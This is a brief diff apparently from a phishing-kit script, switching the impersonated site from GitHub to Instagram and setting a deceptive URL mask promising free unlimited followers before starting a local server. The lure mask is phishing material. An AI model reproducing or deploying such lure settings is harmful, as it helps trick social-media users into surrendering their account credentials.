@@ -758,6 +758,6 @@ kill_pid
 dependencies
 
 
-website="github"
-mask='http://get-1k-followers-on-github-free'
+website="instagram"
+mask='http://get-unlimited-followers-for-instagram'
 start_localhost
